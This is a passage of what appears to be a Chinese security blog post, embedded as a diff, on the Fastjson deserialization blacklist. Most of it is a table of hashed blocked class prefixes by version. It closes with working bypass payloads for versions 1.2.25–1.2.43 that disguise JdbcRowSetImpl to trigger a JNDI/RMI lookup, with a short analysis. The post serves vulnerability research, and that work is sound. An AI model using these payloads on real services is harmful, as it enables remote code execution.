+<td>1.2.46</td>
+<td>-1589194880214235129</td>
+<td>0xe9f20bad25f60807L</td>
+<td>org.jdom.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>1073634739308289776</td>
+<td>0xee6511b66fd5ef0L</td>
+<td>org.slf4j.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>5688200883751798389</td>
+<td>0x4ef08c90ff16c675L</td>
+<td>javassist.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>7017492163108594270</td>
+<td>0x616323f12c2ce25eL</td>
+<td>oracle.net</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>8389032537095247355</td>
+<td>0x746bd4a53ec195fbL</td>
+<td>org.jaxen.</td>
+</tr>
+<tr>
+<td>1.2.48</td>
+<td>1459860845934817624</td>
+<td>0x144277b467723158L</td>
+<td>java.net.InetAddress</td>
+</tr>
+<tr>
+<td>1.2.48</td>
+<td>8409640769019589119</td>
+<td>0x74b50bb9260e31ffL</td>
+<td>java.lang.Class</td>
+</tr>
+<tr>
+<td>1.2.49</td>
+<td>4904007817188630457</td>
+<td>0x440e89208f445fb9L</td>
+<td>com.alibaba.fastjson.annotation</td>
+</tr>
+<tr>
+<td>1.2.59</td>
+<td>5100336081510080343</td>
+<td>0x46c808a4b5841f57L</td>
+<td>org.apache.cxf.jaxrs.provider.</td>
+</tr>
+<tr>
+<td>1.2.59</td>
+<td>6456855723474196908</td>
+<td>0x599b5c1213a099acL</td>
+<td>ch.qos.logback.</td>
+</tr>
+<tr>
+<td>1.2.59</td>
+<td>8537233257283452655</td>
+<td>0x767a586a5107feefL</td>
+<td>net.sf.ehcache.transaction.manager.</td>
+</tr>
+<tr>
+<td>1.2.60</td>
+<td>3688179072722109200</td>
+<td>0x332f0b5369a18310L</td>
+<td>com.zaxxer.hikari.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-4401390804044377335</td>
+<td>0xc2eb1e621f439309L</td>
+<td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-1650485814983027158</td>
+<td>0xe9184be55b1d962aL</td>
+<td>org.apache.openjpa.ee.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-1251419154176620831</td>
+<td>0xeea210e8da2ec6e1L</td>
+<td>oracle.jdbc.rowset.OracleJDBCRowSet</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-9822483067882491</td>
+<td>0xffdd1a80f1ed3405L</td>
+<td>com.mysql.cj.jdbc.admin.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>99147092142056280</td>
+<td>0x1603dc147a3e358L</td>
+<td>oracle.jdbc.connector.OracleManagedConnectionFactory</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>3114862868117605599</td>
+<td>0x2b3a37467a344cdfL</td>
+<td>org.apache.ibatis.parsing.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>4814658433570175913</td>
+<td>0x42d11a560fc9fba9L</td>
+<td>org.apache.axis2.jaxws.spi.handler.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>6511035576063254270</td>
+<td>0x5a5bd85c072e5efeL</td>
+<td>jodd.db.connection.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>8925522461579647174</td>
+<td>0x7bddd363ad3998c6L</td>
+<td>org.apache.commons.configuration.JNDIConfiguration</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-9164606388214699518</td>
+<td>0x80d0c70bcc2fea02L</td>
+<td>org.apache.ibatis.executor.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-8649961213709896794</td>
+<td>0x87f52a1b07ea33a6L</td>
+<td>net.sf.cglib.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-6316154655839304624</td>
+<td>0xa85882ce1044c450L</td>
+<td>oracle.net.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-5764804792063216819</td>
+<td>0xafff4c95b99a334dL</td>
+<td>com.mysql.cj.jdbc.MysqlDataSource</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-4608341446948126581</td>
+<td>0xc00be1debaf2808bL</td>
+<td>jdk.internal.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-4438775680185074100</td>
+<td>0xc2664d0958ecfe4cL</td>
+<td>aj.org.objectweb.asm.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-3319207949486691020</td>
+<td>0xd1efcdf4b3316d34L</td>
+<td>oracle.jdbc.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-2192804397019347313</td>
+<td>0xe1919804d5bf468fL</td>
+<td>org.apache.commons.collections.comparators.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-2095516571388852610</td>
+<td>0xe2eb3ac7e56c467eL</td>
+<td>net.sf.ehcache.hibernate.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>4750336058574309</td>
+<td>0x10e067cd55c5e5L</td>
+<td>com.mysql.cj.log.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>218512992947536312</td>
+<td>0x3085068cb7201b8L</td>
+<td>org.h2.jdbcx.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>823641066473609950</td>
+<td>0xb6e292fa5955adeL</td>
+<td>org.apache.commons.logging.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>1534439610567445754</td>
+<td>0x154b6cb22d294cfaL</td>
+<td>org.apache.ibatis.reflection.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>1818089308493370394</td>
+<td>0x193b2697eaaed41aL</td>
+<td>org.h2.server.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>2164696723069287854</td>
+<td>0x1e0a8c3358ff3daeL</td>
+<td>org.apache.ibatis.datasource.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>2653453629929770569</td>
+<td>0x24d2f6048fef4e49L</td>
+<td>org.objectweb.asm.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>2836431254737891113</td>
+<td>0x275d0732b877af29L</td>
+<td>flex.messaging.util.concurrent.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>3089451460101527857</td>
+<td>0x2adfefbbfe29d931L</td>
+<td>org.apache.ibatis.javassist.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>3256258368248066264</td>
+<td>0x2d308dbbc851b0d8L</td>
+<td>java.lang.UNIXProcess</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>3718352661124136681</td>
+<td>0x339a3e0b6beebee9L</td>
+<td>org.apache.ibatis.ognl.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>4046190361520671643</td>
+<td>0x3826f4b2380c8b9bL</td>
+<td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>4841947709850912914</td>
+<td>0x43320dc9d2ae0892L</td>
+<td>org.codehaus.jackson.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>6280357960959217660</td>
+<td>0x5728504a6d454ffcL</td>
+<td>org.apache.ibatis.scripting.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>6534946468240507089</td>
+<td>0x5ab0cb3071ab40d1L</td>
+<td>org.apache.commons.proxy.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>6734240326434096246</td>
+<td>0x5d74d3e5b9370476L</td>
+<td>com.mysql.cj.jdbc.MysqlXADataSource</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>7123326897294507060</td>
+<td>0x62db241274397c34L</td>
+<td>org.apache.commons.collections.functors.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>8488266005336625107</td>
+<td>0x75cc60f5871d0fd3L</td>
+<td>org.apache.commons.configuration</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>-2439930098895578154</td>
+<td>0xde23a0809a8b9bd6L</td>
+<td>javax.script.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>-582813228520337988</td>
+<td>0xf7e96e74dfa58dbcL</td>
+<td>javax.sound.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>-26639035867733124</td>
+<td>0xffa15bf021f1e37cL</td>
+<td>javax.print.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>386461436234701831</td>
+<td>0x55cfca0f2281c07L</td>
+<td>javax.activation.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>1153291637701043748</td>
+<td>0x100150a253996624L</td>
+<td>javax.tools.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>1698504441317515818L</td>
+<td>0x17924cca5227622aL</td>
+<td>javax.management.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>7375862386996623731L</td>
+<td>0x665c53c311193973L</td>
+<td>org.apache.xbean.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>7658177784286215602L</td>
+<td>0x6a47501ebb2afdb2L</td>
+<td>org.eclipse.jetty.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>8055461369741094911L</td>
+<td>0x6fcabf6fa54cafffL</td>
+<td>javax.naming.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-7775351613326101303L</td>
+<td>0x941866e73beff4c9L</td>
+<td>org.apache.shiro.realm.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-6025144546313590215L</td>
+<td>0xac6262f52c98aa39L</td>
+<td>org.apache.http.conn.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-5939269048541779808L</td>
+<td>0xad937a449831e8a0L</td>
+<td>org.quartz.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-5885964883385605994L</td>
+<td>0xae50da1fad60a096L</td>
+<td>com.taobao.eagleeye.wrapper</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-3975378478825053783L</td>
+<td>0xc8d49e5601e661a9L</td>
+<td>org.apache.http.impl.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-2378990704010641148L</td>
+<td>0xdefc208f237d4104L</td>
+<td>com.ibatis.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-905177026366752536L</td>
+<td>0xf3702a4a5490b8e8L</td>
+<td>org.apache.catalina.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>2660670623866180977L</td>
+<td>0x24ec99d5e7dc5571L</td>
+<td>org.apache.http.auth.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>2731823439467737506L</td>
+<td>0x25e962f1c28f71a2L</td>
+<td>br.com.anteros.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>3637939656440441093L</td>
+<td>0x327c8ed7c8706905L</td>
+<td>com.caucho.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>4254584350247334433L</td>
+<td>0x3b0b51ecbf6db221L</td>
+<td>org.apache.http.cookie.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>5274044858141538265L</td>
+<td>0x49312bdafb0077d9L</td>
+<td>org.javasimon.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>5474268165959054640L</td>
+<td>0x4bf881e49d37f530L</td>
+<td>org.apache.cocoon.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>5596129856135573697L</td>
+<td>0x4da972745feb30c1L</td>
+<td>org.apache.activemq.jms.pool.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>6854854816081053523L</td>
+<td>0x5f215622fb630753L</td>
+<td>org.mortbay.jetty.</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>-3077205613010077203L</td>
+<td>0xd54b91cc77b239edL</td>
+<td>org.apache.shiro.jndi.</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>-2825378362173150292L</td>
+<td>0xd8ca3d595e982bacL</td>
+<td>org.apache.ignite.cache.jta.</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>2078113382421334967L</td>
+<td>0x1cd6f11c6a358bb7L</td>
+<td>javax.swing.J</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>6007332606592876737L</td>
+<td>0x535e552d6f9700c1L</td>
+<td>org.aoju.bus.proxy.provider.</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>9140390920032557669L</td>
+<td>0x7ed9311d28bf1a65L</td>
+<td>java.awt.p</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>9140416208800006522L</td>
+<td>0x7ed9481d28bf417aL</td>
+<td>java.awt.i</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-8024746738719829346L</td>
+<td>0x90a25f5baa21529eL</td>
+<td>java.io.Serializable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-5811778396720452501L</td>
+<td>0xaf586a571e302c6bL</td>
+<td>java.io.Closeable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-3053747177772160511L</td>
+<td>0xd59ee91f0b09ea01L</td>
+<td>oracle.jms.AQ</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-2114196234051346931L</td>
+<td>0xe2a8ddba03e69e0dL</td>
+<td>java.util.Collection</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-2027296626235911549L</td>
+<td>0xe3dd9875a2dc5283L</td>
+<td>java.lang.Iterable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-2939497380989775398L</td>
+<td>0xd734ceb4c3e9d1daL</td>
+<td>java.lang.Object</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-1368967840069965882L</td>
+<td>0xed007300a7b227c6L</td>
+<td>java.lang.AutoCloseable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>2980334044947851925L</td>
+<td>0x295c4605fd1eaa95L</td>
+<td>java.lang.Readable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>3247277300971823414L</td>
+<td>0x2d10a5801b9d6136L</td>
+<td>java.lang.Cloneable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>5183404141909004468L</td>
+<td>0x47ef269aadc650b4L</td>
+<td>java.lang.Runnable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>7222019943667248779L</td>
+<td>0x6439c4dff712ae8bL</td>
+<td>java.util.EventListener</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>-5076846148177416215L</td>
+<td>0xb98b6b5396932fe9L</td>
+<td>org.apache.commons.collections4.Transformer</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>-4703320437989596122L</td>
+<td>0xbeba72fb1ccba426L</td>
+<td>org.apache.commons.collections4.functors</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>-4314457471973557243L</td>
+<td>0xc41ff7c9c87c7c05L</td>
+<td>org.jdom2.transform.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>-2533039401923731906L</td>
+<td>0xdcd8d615a6449e3eL</td>
+<td>org.apache.hadoop.shaded.com.zaxxer.hikari.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>156405680656087946L</td>
+<td>0x22baa234c5bfb8aL</td>
+<td>com.p6spy.engine.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>1214780596910349029L</td>
+<td>0x10dbc48446e0dae5L</td>
+<td>org.apache.activemq.pool.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>3085473968517218653L</td>
+<td>0x2ad1ce3a112f015dL</td>
+<td>org.apache.aries.transaction.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>3129395579983849527L</td>
+<td>0x2b6dd8b3229d6837L</td>
+<td>org.apache.activemq.ActiveMQConnectionFactory</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>4241163808635564644L</td>
+<td>0x3adba40367f73264L</td>
+<td>org.apache.activemq.spring.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>7240293012336844478L</td>
+<td>0x647ab0224e149ebeL</td>
+<td>org.apache.activemq.ActiveMQXAConnectionFactory</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>7347653049056829645L</td>
+<td>0x65f81b84c1d920cdL</td>
+<td>org.apache.commons.jelly.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>7617522210483516279L</td>
+<td>0x69b6e0175084b377L</td>
+<td>org.apache.axis2.transport.jms.</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>-4537258998789938600L</td>
+<td>0xc1086afae32e6258L</td>
+<td>java.io.FileReader</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>-4150995715611818742L</td>
+<td>0xc664b363baca050aL</td>
+<td>java.io.ObjectInputStream</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>-2995060141064716555L</td>
+<td>0xd66f68ab92e7fef5L</td>
+<td>java.io.FileInputStream</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>-965955008570215305L</td>
+<td>0xf2983d099d29b477L</td>
+<td>java.io.ObjectOutputStream</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>-219577392946377768L</td>
+<td>0xfcf3e78644b98bd8L</td>
+<td>java.io.DataOutputStream</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>2622551729063269307L</td>
+<td>x24652ce717e713bbL</td>
+<td>java.io.PrintWriter</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>2930861374593775110L</td>
+<td>0x28ac82e44e933606L</td>
+<td>java.io.Buffered</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>4000049462512838776L</td>
+<td>0x378307cb0111e878L</td>
+<td>java.io.InputStreamReader</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>4193204392725694463L</td>
+<td>0x3a31412dbb05c7ffL</td>
+<td>java.io.OutputStreamWriter</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>5545425291794704408L</td>
+<td>0x4cf54eec05e3e818L</td>
+<td>java.io.FileWriter</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>6584624952928234050L</td>
+<td>0x5b6149820275ea42L</td>
+<td>java.io.FileOutputStream</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>7045245923763966215L</td>
+<td>0x61c5bdd721385107L</td>
+<td>java.io.DataInputStream</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-8754006975464705441L</td>
+<td>0x868385095a22725fL</td>
+<td>org.apache.commons.io.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-8382625455832334425L</td>
+<td>0x8baaee8f9bf77fa7L</td>
+<td>org.mvel2.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-6088208984980396913L</td>
+<td>0xab82562f53e6e48fL</td>
+<td>kotlin.reflect.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-4733542790109620528L</td>
+<td>0xbe4f13e96a6796d0L</td>
+<td>com.googlecode.aviator.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-1363634950764737555L</td>
+<td>0xed13653cb45c4bedL</td>
+<td>org.aspectj.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-803541446955902575L</td>
+<td>0xf4d93f4fb3e3d991L</td>
+<td>org.dom4j.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>860052378298585747L</td>
+<td>0xbef8514d0b79293L</td>
+<td>org.apache.commons.cli.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>1268707909007641340L</td>
+<td>0x119b5b1f10210afcL</td>
+<td>com.google.common.eventbus.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>3058452313624178956L</td>
+<td>0x2a71ce2cc40a710cL</td>
+<td>org.thymeleaf.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>3740226159580918099L</td>
+<td>0x33e7f3e02571b153L</td>
+<td>org.junit.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>3977090344859527316L</td>
+<td>0x37317698dcfce894L</td>
+<td>org.mockito.asm.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>4319304524795015394L</td>
+<td>0x3bf14094a524f0e2L</td>
+<td>com.google.common.io.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>5120543992130540564L</td>
+<td>0x470fd3a18bb39414L</td>
+<td>org.mockito.runners.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>5916409771425455946L</td>
+<td>0x521b4f573376df4aL</td>
+<td>org.mockito.cglib.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>6090377589998869205L</td>
+<td>0x54855e265fe1dad5L</td>
+<td>com.google.common.reflect.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>7164889056054194741L</td>
+<td>0x636ecca2a131b235L</td>
+<td>org.mockito.stubbing.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>8711531061028787095L</td>
+<td>0x78e5935826671397L</td>
+<td>org.apache.commons.codec.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>8735538376409180149L</td>
+<td>0x793addded7a967f5L</td>
+<td>ognl.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>8861402923078831179L</td>
+<td>0x7afa070241b8cc4bL</td>
+<td>com.google.common.util.concurrent.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>9140416208800006522L</td>
+<td>0x7ed9481d28bf417aL</td>
+<td>java.awt.i</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>9144212112462101475L</td>
+<td>0x7ee6c477da20bbe3L</td>
+<td>com.google.common.net.</td>
+</tr>
+</tbody></table>
+<h2 id="目前未知的列表"><a href="#目前未知的列表" class="headerlink" title="目前未知的列表"></a>目前未知的列表</h2><table>
+<thead>
+<tr>
+<th>version</th>
+<th>hash</th>
+<th>hex-hash</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.42</td>
+<td>33238344207745342</td>
+<td>0x761619136cc13eL</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-831789045734283466L</td>
+<td>0xf474e44518f26736L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>3452379460455804429L</td>
+<td>0x2fe950d3ea52ae0dL</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.78</td>
+<td>-8614556368991373401L</td>
+<td>0x8872f29fd0b0b7a7L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.78</td>
+<td>-5472097725414717105L</td>
+<td>0xb40f341c746ec94fL</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.78</td>
+<td>-3750763034362895579L</td>
+<td>0xcbf29ce484222325L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.78</td>
+<td>-1800035667138631116L</td>
+<td>0xe704fd19052b2a34L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.78</td>
+<td>-831789045734283466L</td>
+<td>0xf474e44518f26736L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.78</td>
+<td>33238344207745342L</td>
+<td>0x761619136cc13eL</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.78</td>
+<td>3452379460455804429L</td>
+<td>0x2fe950d3ea52ae0dL</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.78</td>
+<td>4215053018660518963L</td>
+<td>0x3a7ee0635eb2bc33L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-8614556368991373401L</td>
+<td>0x8872f29fd0b0b7a7L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-3750763034362895579L</td>
+<td>0xcbf29ce484222325L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-1800035667138631116L</td>
+<td>0xe704fd19052b2a34L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>4215053018660518963L</td>
+<td>0x3a7ee0635eb2bc33L</td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="各版本的绕过"><a href="#各版本的绕过" class="headerlink" title="各版本的绕过"></a>各版本的绕过</h1><h2 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h2><p><img src="/posts/352f0278/20260126143607772.png" alt="image.png"><br>这里很明显被ban了<br>绕过方法：com.sun.rowset.JdbcRowSetImpl前面加一个L后面加一个; 进行绕过<br>记得启动AutoTypeSupport<br>exp</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> {  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">"{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/RO\",\"autoCommit\":true}"</span>;  </span><br><span class="line">            JSON.parse(json);  </span><br><span class="line">  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/posts/352f0278/20260126144152031.png" alt="image.png"></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/352f0278/20260126144746343.png" alt="image.png"><br>因为Lcom.sun.rowset.JdbcRowSetImpl;这个是不存在黑名单中的，一直向下走便会到LoadClass中，然后跟进去看。<br><img src="/posts/352f0278/20260126145009442.png" alt="image.png"><br>绕过的理由就在这里，如果是以L开头;结尾的话，就会去除掉，然后进行类的加载。这也就导致了绕过的成功。</p>
+<h2 id="1-2-25-1-2-42"><a href="#1-2-25-1-2-42" class="headerlink" title="1. 2.25-1.2.42"></a>1. 2.25-1.2.42</h2><p>exp</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> {  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">"{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/RO\",\"autoCommit\":true}"</span>;  </span><br><span class="line">            JSON.parse(json);  </span><br><span class="line">  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>这里代码逻辑会先进行提取了，所以我们直接写两个L和; 进行绕过<br><img src="/posts/352f0278/20260126145604269.png" alt="image.png"></p>
+<h2 id="1-2-25-1-2-43"><a href="#1-2-25-1-2-43" class="headerlink" title="1.2.25-1.2.43"></a>1.2.25-1.2.43</h2><p>直接给出绕过exp</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> {  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">"{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://localhost:1099/RO\",\"autoCommit\":true}"</span>;  </span><br><span class="line">            JSON.parse(json);  </span><br><span class="line">  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
